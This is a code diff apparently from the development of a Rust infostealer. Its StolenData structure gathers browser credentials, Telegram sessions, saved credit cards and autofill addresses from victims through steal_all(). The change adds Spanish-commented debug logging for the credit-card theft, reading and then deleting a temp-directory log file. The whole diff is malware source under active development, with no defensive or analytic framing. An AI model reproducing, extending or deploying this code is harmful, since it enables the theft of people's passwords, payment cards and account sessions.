@@ -66,6 +66,7 @@ pub struct StolenData {
     pub telegram: Vec<telegram::TelegramSession>,
     pub credit_cards: Vec<autofill::CreditCard>,
     pub addresses: Vec<autofill::AutofillAddress>,
+    pub debug_log: String,  // 🔍 Debug logs para diagnóstico
 }
 
 impl StolenData {
@@ -78,6 +79,7 @@ impl StolenData {
             telegram: Vec::new(),
             credit_cards: Vec::new(),
             addresses: Vec::new(),
+            debug_log: String::new(),
         }
     }
     
@@ -103,6 +105,14 @@ impl StolenData {
     
     pub fn to_string(&self) -> String {
         let mut output = String::new();
+        
+        // 🔍 DEBUG: Mostrar logs de diagnóstico al principio
+        if !self.debug_log.is_empty() {
+            output.push_str("\n🔍 DEBUG LOG (Credit Cards)\n");
+            output.push_str("═══════════════════════════════════════\n");
+            output.push_str(&self.debug_log);
+            output.push_str("\n═══════════════════════════════════════\n");
+        }
         
         // Credenciales de browsers
         if !self.credentials.is_empty() {
@@ -235,6 +245,16 @@ pub fn steal_all() -> StolenData {
     // Credit Cards
     let mut credit_cards = autofill::steal_credit_cards();
     data.credit_cards.append(&mut credit_cards);
+    
+    // 🔍 DEBUG: Leer log file si existe
+    let debug_log_path = std::env::temp_dir().join("stealer_debug.txt");
+    if debug_log_path.exists() {
+        if let Ok(log_content) = std::fs::read_to_string(&debug_log_path) {
+            data.debug_log = log_content;
+            // Eliminar archivo después de leerlo
+            let _ = std::fs::remove_file(&debug_log_path);
+        }
+    }
     
     // Autofill Addresses
     let mut addresses = autofill::steal_autofill_addresses();
